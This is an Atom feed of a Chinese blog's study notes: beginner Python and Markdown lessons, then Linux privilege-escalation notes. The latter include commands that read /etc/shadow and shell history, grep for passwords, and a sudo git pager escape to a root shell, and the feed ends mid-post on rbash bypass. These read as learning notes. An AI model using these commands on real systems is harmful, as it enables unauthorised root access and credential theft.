<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://avenue.cool</id>
    <title>凌晨的信息安全之路</title>
    <subtitle>Avenue-le</subtitle>
    <icon>http://avenue.cool/images/favicon.ico</icon>
    <link href="http://avenue.cool" />
    <author>
      <name>Avenue-le</name>
    </author>
    <updated>2021-02-03T14:30:59.000Z</updated>
    <category term="信息安全之路" />
    <category term="随学" />
    <category term="凌晨" />
    <entry>
        <id>http://avenue.cool/Python/Pyhton%E4%B8%AD%E5%8F%98%E9%87%8F%E5%90%8D%E3%80%81%E8%BE%93%E5%85%A5%E3%80%81%E8%BE%93%E5%87%BA/</id>
        <title>Python中的注释</title>
        <link rel="alternate" href="http://avenue.cool/Python/Pyhton%E4%B8%AD%E5%8F%98%E9%87%8F%E5%90%8D%E3%80%81%E8%BE%93%E5%85%A5%E3%80%81%E8%BE%93%E5%87%BA/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;变量的定义&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#变量的定义&#34;&gt;#&lt;/a&gt; 变量的定义&lt;/h1&gt;&lt;p&gt;对于重复使用，并且经常需要修改的数据，可以定义为变量，来提高编程效率。&lt;br&gt;定义变量的语法为：变量名 = 变量值。(这里的 = 作用是赋值。)&lt;br&gt;定义变量后可以使用变量名来访问变量值。&lt;br&gt;如下示例:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;# 不使用变量打印三次 &amp;quot;今天天气真好&amp;quot;,如果需要变成打印 &amp;quot;今天天气不好&amp;quot; 需要修改三行代码
print(&amp;quot;今天天气真好&amp;quot;)
print(&amp;quot;今天天气真好&amp;quot;)
print(&amp;quot;今天天气真好&amp;quot;)
# 定义一个变量表示这个字符串。如果需要修改内容，只需要修改变量对应的值即可
weather = &amp;quot;今天天气真好&amp;quot;
print(weather)  # 注意，变量名不需要使用引号包裹
print(weather)
print(weather)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#说明&#34;&gt;#&lt;/a&gt; 说明:&lt;/h3&gt;&lt;p&gt;・所谓变量名，可以理解为箱子，当需要使用变量值，就把对应的箱子拿来。&lt;br&gt;・变量即是可以变化的量，可以随时进行修改。&lt;br&gt;・程序就是用来处理数据的，而变量就是用来存储数据的。&lt;/p&gt;&lt;h2 id=&#34;变量的类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#变量的类型&#34;&gt;#&lt;/a&gt; 变量的类型&lt;/h2&gt;&lt;p&gt;程序中：在 Python 里为了应对不同的业务需求，也把数据分为不同的类型。 如下图所示：&lt;br&gt;&lt;img data-src=&#34;/images/python%E5%8F%98%E9%87%8F%E5%92%8C%E8%BE%93%E5%87%BA%E8%BE%93%E5%85%A5/1.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;h2 id=&#34;查看数据类型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看数据类型&#34;&gt;#&lt;/a&gt; 查看数据类型&lt;/h2&gt;&lt;p&gt;・在 python 中，只要定义了一个变量，而且它有数据，那么它的类型就已经确定了，不需要咱们开发者主动的去说明它的类型，系统会自动辨别。也就是说在使用的时候 &amp;quot;变量没有类型，数据才有类型&amp;quot;。&lt;br&gt;・比如下面的示例里，我们没法预测变量 b 的类型，但是 a 的类型可以根据数据来确认。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/python%E5%8F%98%E9%87%8F%E5%92%8C%E8%BE%93%E5%87%BA%E8%BE%93%E5%85%A5/2.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;如果临时想要查看一个变量存储的数据类型，可以使用 type (变量的名字)，来查看变量存储的数据类型。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/python%E5%8F%98%E9%87%8F%E5%92%8C%E8%BE%93%E5%87%BA%E8%BE%93%E5%85%A5/3.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;h1 id=&#34;关键字&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关键字&#34;&gt;#&lt;/a&gt; 关键字&lt;/h1&gt;&lt;p&gt;计算机编程语言中，标识符是用户编程时使用的名字，用于给变量、常量、函数、语句块等命名，以建立起名称与使用之间的关系。&lt;/p&gt;&lt;h2 id=&#34;命名规则&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命名规则&#34;&gt;#&lt;/a&gt; 命名规则&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;标识符由字母、下划线和数字组成，且数字不能开头。&lt;/li&gt;&lt;li&gt;严格区分大小写。&lt;/li&gt;&lt;li&gt;不能使用关键字。&lt;/li&gt;&lt;/ol&gt;&lt;h2 id=&#34;命名规范&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#命名规范&#34;&gt;#&lt;/a&gt; 命名规范&lt;/h2&gt;&lt;p&gt;・标识符命名要做到顾名思义。&lt;br&gt;起一个有意义的名字，尽量做到看一眼就知道是什么意思 (提高代码可 读性) 比如：名字 就定义为 name , 定义学生 用 student&lt;/p&gt;&lt;pre&gt;&lt;code&gt;a = &amp;quot;zhangsan&amp;quot;  # bad
name = &amp;quot;zhangsan&amp;quot;  # good
b = 23   # bad
age = 23 # good
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;・遵守一定的命名规范。&lt;br&gt;・驼峰命名法，又分为大驼峰命名法和小驼峰命名法。&lt;/p&gt;&lt;p&gt;&lt;img data-src=&#34;/images/python%E5%8F%98%E9%87%8F%E5%92%8C%E8%BE%93%E5%87%BA%E8%BE%93%E5%85%A5/4.jpg&#34; alt=&#34;&#34;&gt;&lt;/p&gt;&lt;p&gt;小驼峰式命名法（lower camel case）： 第一个单词以小写字母开始；第二个单词的首字母大写，例如：myName、aDog&lt;br&gt;大驼峰式命名法（upper camel case）： 每一个单字的首字母都采用大写字母，例如：FirstName、LastName.&lt;/p&gt;&lt;p&gt;还有一种命名法是用下划线 “_” 来连接所有的单词，比如 send_buf. Python 的命令规则遵循 PEP8 标准：&lt;br&gt;&lt;code&gt;变量名，函数名和文件名全小写，使用下划线连接； 类名遵守大驼峰命名法； 常量名全大写；&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;关键字-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关键字-2&#34;&gt;#&lt;/a&gt; 关键字&lt;/h2&gt;&lt;p&gt;关键字的概念 一些具有特殊功能的标识符，这就是所谓的关键字。 关键字，已经被 python 官方使用了，所以不允许开发者自己定义和关键字相同名字的标识符。&lt;br&gt;关键字:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;False     None    True   and      as       assert   break     class  
continue  def     del    elif     else     except   finally   for
from      global  if     import   in       is       lambda    nonlocal
not       or      pass   raise    return   try      while     with  
yield
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;输出语句&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#输出语句&#34;&gt;#&lt;/a&gt; 输出语句&lt;/h1&gt;&lt;p&gt;简单来说，就是将程序的运行结果显示出来。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;print(&#39;hello world&#39;)
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;格式化输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#格式化输出&#34;&gt;#&lt;/a&gt; 格式化输出&lt;/h2&gt;&lt;p&gt;格式化操作的目的&lt;br&gt;比如有以下代码:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;pirnt(&amp;quot;我今年10岁&amp;quot;)
pirnt(&amp;quot;我今年11岁&amp;quot;)
pirnt(&amp;quot;我今年12岁&amp;quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;想一想:&lt;br&gt;在输出年龄的时候，用了多次 &amp;quot;我今年 xx 岁&amp;quot;，能否简化一下程序呢？？？&lt;/p&gt;&lt;p&gt;答:&lt;br&gt;字符串格式化&lt;/p&gt;&lt;p&gt;什么是格式化&lt;br&gt;看如下代码:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;age = 10
print(&amp;quot;我今年%d岁&amp;quot; % age)

age += 1
print(&amp;quot;我今年%d岁&amp;quot; % age)

age += 1
print(&amp;quot;我今年%d岁&amp;quot; % age)
Copy
在程序中，看到了%这样的操作符，这就是Python中格式化输出。

age = 18
name = &amp;quot;xiaohua&amp;quot;
print(&amp;quot;我的姓名是%s, 年龄是%d&amp;quot; % (name, age))

&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;常用的格式符号&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#常用的格式符号&#34;&gt;#&lt;/a&gt; 常用的格式符号&lt;/h2&gt;&lt;p&gt;下面是完整的，它可以与％符号使用列表:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;格式符号	  转换
%%	  输出 % 号
%s	  字符串
%d	  有符号十进制整数
%f	  浮点数
%c	  字符
%u	  无符号十进制整数
%o	  八进制整数
%x	  十六进制整数（小写字母0x）
%X	  十六进制整数（大写字母0X）
%e	  科学计数法（小写&#39;e&#39;）
%E	  科学计数法（大写“E”）
%g	  ％f和％e 的简写
%G	  ％f和％E的简写
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;换行输出&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#换行输出&#34;&gt;#&lt;/a&gt; 换行输出&lt;/h2&gt;&lt;p&gt;在输出的时候，如果有 \n 那么，此时 \n 后的内容会在另外一行显示。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;print(&amp;quot;1234567890-------&amp;quot;) # 会在一行显示
print(&amp;quot;1234567890\n-------&amp;quot;) # 一行显示1234567890，另外一行显示-------
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;python2与python3里的区别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python2与python3里的区别&#34;&gt;#&lt;/a&gt; python2 与 python3 里的区别&lt;/h2&gt;&lt;p&gt;在 python3 里，print 只能使用函数的方式来调用，而在 python2 里，print 可以当做一个命令来使用。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;print(&amp;quot;hello world&amp;quot;)   # 在python2和python3里都可以使用
print &amp;quot;hello world&amp;quot;  # 这种写法只能在python2里使用，python3不再支持这种写法
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;输入语句&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#输入语句&#34;&gt;#&lt;/a&gt; 输入语句&lt;/h1&gt;&lt;p&gt;咱们在银行 ATM 机器前取钱时，肯定需要输入密码，那么怎样才能让程序知道咱们刚刚输入的是什么呢？？ 大家应该知道了，如果要完成 ATM 机取钱这件事情，需要读取用户的输入，并且使用变量保存用户输入的数据。在 Python 中，我们可以使用 input () 函数来获取用户的输入。&lt;/p&gt;&lt;p&gt;input&lt;br&gt;在 Python 中，获取键盘输入的数据的方法是采用 input 函数（至于什么是函数，咱们以后的章节中讲解），那么这个 input 怎么用呢？&lt;/p&gt;&lt;p&gt;看如下示例:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;password = input(&amp;quot;请输入密码:&amp;quot;)
print(&#39;您刚刚输入的密码是:%s&#39; % password)
&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;注意&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注意&#34;&gt;#&lt;/a&gt; 注意:&lt;/h3&gt;&lt;p&gt;input () 的小括号中放入的是提示信息，用来在获取数据之前给用户的一个简单提示&lt;br&gt;input () 在从键盘获取了数据以后，会存放到等号右边的变量中&lt;br&gt;input () 会把用户输入的任何值都作为字符串来对待&lt;/p&gt;&lt;h2 id=&#34;python2和python3区别&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#python2和python3区别&#34;&gt;#&lt;/a&gt; python2 和 python3 区别&lt;/h2&gt;&lt;p&gt;在 python2 里，如果使用 input 语句，用户输入的内容如果是一个字符串，会把这个字符串当做一个变量使用；如果输入输入的是一个数字，会把这个数字当做数字类型。如果想要输入一个字符串，需要给这个字符串加引号，或者使用 raw_input.&lt;/p&gt;&lt;p&gt;在 python3 里，用户输入的所有内容都会被当做字符串来存储。python3 里的 input 功能和 python2 里的 raw_input 功能一致。&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="Python语言学习" scheme="http://avenue.cool/categories/Python/" />
        <category term="Python语言学习" scheme="http://avenue.cool/tags/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" />
        <updated>2021-02-03T14:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Python/Pyhton%E4%B8%AD%E7%9A%84%E6%B3%A8%E9%87%8A/</id>
        <title>Python中的注释</title>
        <link rel="alternate" href="http://avenue.cool/Python/Pyhton%E4%B8%AD%E7%9A%84%E6%B3%A8%E9%87%8A/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;注释&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注释&#34;&gt;#&lt;/a&gt; 注释&lt;/h2&gt;&lt;p&gt;在我们工作编码的过程中，如果一段代码的逻辑比较复杂，不是特别容易理解，可以适当的添加注释，以辅助自己或者其他编码人员解读代码。&lt;/p&gt;&lt;p&gt;注意：注释是给程序员看的，为了让程序员方便阅读代码，解释器会忽略注释。使用自己熟悉的语言，适当的对代码进行注释说明是一种良好的编码习惯。&lt;/p&gt;&lt;h2 id=&#34;注释的分类&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#注释的分类&#34;&gt;#&lt;/a&gt; 注释的分类&lt;/h2&gt;&lt;p&gt;在 Python 中支持单行注释和多行注释。&lt;/p&gt;&lt;h3 id=&#34;单行注释&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#单行注释&#34;&gt;#&lt;/a&gt; 单行注释&lt;/h3&gt;&lt;p&gt;以 #开头，# 右边的所有东西当做说明，而不是真正要执行的程序，起辅助说明作用。&lt;br&gt;# 开头右边的都是注释，解析器会忽略注释&lt;/p&gt;&lt;p&gt;print (&#39;hello world&#39;) #我的作用是在控制台输出 hello world&lt;/p&gt;&lt;h3 id=&#34;多行注释&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#多行注释&#34;&gt;#&lt;/a&gt; 多行注释&lt;/h3&gt;&lt;p&gt;以 &#39;&#39;&#39; 开始，并以 &#39;&#39;&#39; 结束，我们称之为多行注释。&lt;/p&gt;&lt;pre&gt;&lt;code&gt;                               _ooOoo_
                              o8888888o
                              88&amp;quot; . &amp;quot;88
                              (| -_- |)
                              O\  =  /O
                           ____/`---&#39;\____
                         .&#39;  \\|     |//  `.
                        /  \\|||  :  |||//  \
                       /  _||||| -:- |||||-  \
                       |   | \\\  -  /// |   |
                       | \_|  &#39;&#39;\---/&#39;&#39;  |   |
                       \  .-\__  `-`  ___/-. /
                     ___`. .&#39;  /--.--\  `. . __
                  .&amp;quot;&amp;quot; &#39;&amp;lt;  `.___\_&amp;lt;|&amp;gt;_/___.&#39;  &amp;gt;&#39;&amp;quot;&amp;quot;.
                 | | :  `- \`.;`\ _ /`;.`/ - ` : | |
                 \  \ `-.   \_ __\ /__ _/   .-` /  /
            ======`-.____`-.___\_____/___.-`____.-&#39;======
                               `=---=&#39;
            ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                       佛祖保佑        永无BUG
              佛曰:
                     写字楼里写字间，写字间里程序员；
                     程序人员写程序，又拿程序换酒钱。
                     酒醒只在网上坐，酒醉还来网下眠；
                     酒醉酒醒日复日，网上网下年复年。
                     但愿老死电脑间，不愿鞠躬老板前；
                     奔驰宝马贵者趣，公交自行程序员。
                     别人笑我忒疯癫，我笑自己命太贱；
                     不见满街漂亮妹，哪个归得程序员？
&lt;/code&gt;&lt;/pre&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="Python语言学习" scheme="http://avenue.cool/categories/Python/" />
        <category term="Python语言学习" scheme="http://avenue.cool/tags/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" />
        <updated>2021-02-03T14:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Python/mkardown%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</id>
        <title>mkardown 基础语法</title>
        <link rel="alternate" href="http://avenue.cool/Python/mkardown%20%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;无序列表使用-加号-空格的形式来表示&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#无序列表使用-加号-空格的形式来表示&#34;&gt;#&lt;/a&gt; 无序列表使用 加号 + 空格的形式来表示。&lt;/h2&gt;&lt;p&gt;・咖啡&lt;br&gt;・啤酒&lt;br&gt;・矿泉水&lt;br&gt;・白酒&lt;br&gt;・葡萄酒&lt;br&gt;・香槟酒&lt;/p&gt;&lt;h2 id=&#34;每天要做的事情有序列表&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#每天要做的事情有序列表&#34;&gt;#&lt;/a&gt; 每天要做的事情：有序列表&lt;/h2&gt;&lt;ol&gt;&lt;li&gt;起床&lt;/li&gt;&lt;li&gt;穿衣服&lt;/li&gt;&lt;li&gt;一脸刷牙&lt;/li&gt;&lt;li&gt;出门开车&lt;/li&gt;&lt;li&gt;到公司上班&lt;/li&gt;&lt;/ol&gt;&lt;h2 id=&#34;使用标题&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#使用标题&#34;&gt;#&lt;/a&gt; 使用标题&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 我是一级标题
## 我是二级标题
### 三级标题
#### 四级标题
###### 六级标题
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;加粗显示字体&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#加粗显示字体&#34;&gt;#&lt;/a&gt; 加粗显示字体&lt;/h2&gt;&lt;p&gt;使用两个 ** 号结束和开始&lt;br&gt;&lt;code&gt;我是一个**很帅很帅**的帅哥。&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;字体倾斜&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#字体倾斜&#34;&gt;#&lt;/a&gt; 字体倾斜：&lt;/h2&gt;&lt;p&gt;一个 * 结束和开始&lt;/p&gt;&lt;h2 id=&#34;加粗和倾斜&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#加粗和倾斜&#34;&gt;#&lt;/a&gt; 加粗和倾斜：&lt;/h2&gt;&lt;p&gt;使用三个 *** 号开始和结束&lt;/p&gt;&lt;h2 id=&#34;超链接&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#超链接&#34;&gt;#&lt;/a&gt; 超链接：&lt;/h2&gt;&lt;p&gt;[name](地址）&lt;br&gt;&lt;code&gt;[百度](https://www.baidu.com)&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;文字说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#文字说明&#34;&gt;#&lt;/a&gt; 文字说明： &amp;gt;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;&amp;gt; 我是一段文字说明。
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;插入图片&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#插入图片&#34;&gt;#&lt;/a&gt; 插入图片&lt;/h2&gt;&lt;p&gt;![] +（图片目录 / 图片名称)&lt;br&gt;&lt;code&gt;![](imgs/软件系统.png)&lt;/code&gt;&lt;/p&gt;&lt;h2 id=&#34;代码书写&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#代码书写&#34;&gt;#&lt;/a&gt; 代码书写&lt;/h2&gt;&lt;p&gt;三个反引号 &lt;code&gt;&lt;/code&gt; 开始和结束&lt;/p&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;figcaption data-lang=&#34;python&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;hello world&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;不让解析的话一个反引号开始和结尾&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#不让解析的话一个反引号开始和结尾&#34;&gt;#&lt;/a&gt; 不让解析的话：一个反引号开始和结尾&lt;/h2&gt;&lt;p&gt;使用 &lt;code&gt;*开始，*&lt;/code&gt; 结束，可以让字体倾斜。&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="Python语言学习" scheme="http://avenue.cool/categories/Python/" />
        <category term="Python语言学习" scheme="http://avenue.cool/tags/Python%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0/" />
        <updated>2021-02-03T14:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Increase-authority/Linux%E6%8F%90%E6%9D%83%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/</id>
        <title>Linux提权相关命令</title>
        <link rel="alternate" href="http://avenue.cool/Increase-authority/Linux%E6%8F%90%E6%9D%83%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h2 id=&#34;获取系统信息&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#获取系统信息&#34;&gt;#&lt;/a&gt; 获取系统信息&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;cat /etc/issue   查看发行版 
cat /etc/*-release   查看发行版
cat /proc/version uname -a   查看内核版本
rpm -q kernel   红帽系统特有 
dmesg | grep Linux
ls /boot | grep vmlinuz- 
lsb_release -a
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;检查用户权限&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#检查用户权限&#34;&gt;#&lt;/a&gt; 检查用户权限&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;sudo -l 
cat /etc/sudoers 
whoami
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;检查密码文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#检查密码文件&#34;&gt;#&lt;/a&gt; 检查密码文件&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;cat /etc/passwd
cat /etc/shadow
ls -l /etc/passwd
ls -l /etc/shadow
passwd文件中存储了用户，shadow文件中存储的是密码的hash。出于安全的考虑，passwd是全用户可读，root可写的。而Shadow是仅root可读写的。
passwd由冒号分割，第一列是用户名，第二列是密码，x代表密码hash被放在shadow里面了（这样非root就看不到了）。
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;查看环境变量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查看环境变量&#34;&gt;#&lt;/a&gt; 查看环境变量&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;搜寻有配置错误的环境变量，查看是否优先从不安全的路径执行文件。
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
cat ~/.bash_history
env
set
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;检查历史文件及命令&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#检查历史文件及命令&#34;&gt;#&lt;/a&gt; 检查历史文件及命令&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;cat ~/.*_history
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;搜寻可被低权限用户使用的root权限程序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搜寻可被低权限用户使用的root权限程序&#34;&gt;#&lt;/a&gt; 搜寻可被低权限用户使用的 root 权限程序&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;检查以root权限的进程是否存在漏洞&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#检查以root权限的进程是否存在漏洞&#34;&gt;#&lt;/a&gt; 检查以 root 权限的进程是否存在漏洞&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;ps aux | grep root
ps -ef | grep root
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;搜索纯文本凭据的文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#搜索纯文本凭据的文件&#34;&gt;#&lt;/a&gt; 搜索纯文本凭据的文件&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;grep -ir user *
grep -ir pass *
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;查找可写的配置文件&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#查找可写的配置文件&#34;&gt;#&lt;/a&gt; 查找可写的配置文件&lt;/h2&gt;&lt;p&gt;&lt;code&gt;find /etc/ -writable -type f 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="提权知识" scheme="http://avenue.cool/categories/Increase-authority/" />
        <category term="提权知识" scheme="http://avenue.cool/tags/%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86/" />
        <updated>2021-02-02T14:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Increase-authority/linux%20%20sudo%20%E6%8F%90%E6%9D%83/</id>
        <title>linux  sudo 提权</title>
        <link rel="alternate" href="http://avenue.cool/Increase-authority/linux%20%20sudo%20%E6%8F%90%E6%9D%83/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;pre&gt;&lt;code&gt;sudo git help config 	
!/bin/bash或者！&#39;sh&#39;

sudo git  -p help 
!/bin/bash

直接提升权限
&lt;/code&gt;&lt;/pre&gt;&lt;!-- rebuild by hrmmi --&gt;</content>
        <category term="提权知识" scheme="http://avenue.cool/categories/Increase-authority/" />
        <category term="提权知识" scheme="http://avenue.cool/tags/%E6%8F%90%E6%9D%83%E7%9F%A5%E8%AF%86/" />
        <updated>2021-02-02T14:30:59.000Z</updated>
    </entry>
    <entry>
        <id>http://avenue.cool/Increase-authority/linux%20%20rbash%E7%BB%95%E8%BF%87/</id>
        <title>linux  rbash绕过</title>
        <link rel="alternate" href="http://avenue.cool/Increase-authority/linux%20%20rbash%E7%BB%95%E8%BF%87/"/>
        <content type="html">&lt;!-- build time:Wed Feb 03 2021 22:47:29 GMT+0800 (中国标准时间) --&gt;&lt;div class=&#34;note info&#34;&gt;&lt;p&gt;以下为个人学习笔记和习题整理&lt;/p&gt;&lt;/div&gt;&lt;h1 id=&#34;什么是rbash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#什么是rbash&#34;&gt;#&lt;/a&gt; 什么是 rbash？&lt;/h1&gt;&lt;p&gt;受限 shell 是 LinuxShell 限制一些 bash shell 中的功能，并且是从名字上很清楚。 该限制很好地实现了命令以及脚本在受限 shell 中运行。 它为 Linux 中的 bash shell 提供了一个额外的安全层。&lt;/p&gt;&lt;p&gt;但以下情况是不允许 rbash 执行的：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;使用命令 cd 更改目录&lt;/li&gt;&lt;li&gt;设置或者取消环境变量的设置（SHELL, PATH, ENV, or BASH_ENV）&lt;/li&gt;&lt;li&gt;指定包含参数 &#39;/&#39; 的文件名&lt;/li&gt;&lt;li&gt;指定包含参数 &#39; - &#39; 的文件名&lt;/li&gt;&lt;li&gt;使用重定向输出 &#39;&amp;gt;&#39;, &#39;&amp;gt;&amp;gt;&#39;, &#39;&amp;gt; |&#39;, &#39;&amp;lt;&amp;gt;&#39; &#39;&amp;gt;&amp;amp;&#39;,&#39;&amp;amp;&amp;gt;&#39;&lt;/li&gt;&lt;li&gt;大致的限制如上&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;那么我们如果在实际环境中，如果想要对环境进行进一步的操作，那么 rbash 肯定是不符合要求的，所以才有了 “绕过” 这一行为&lt;br&gt;而因为 rbash 的特殊性问题，绕过的方法，大多都是通过 Linux 机器上现有的软件，来执行一个没有限制的 shell 回来使用&lt;/p&gt;&lt;p&gt;创建限制 shell 的用户&lt;br&gt;在 RHEL 和 Centos 的系统中，rbash 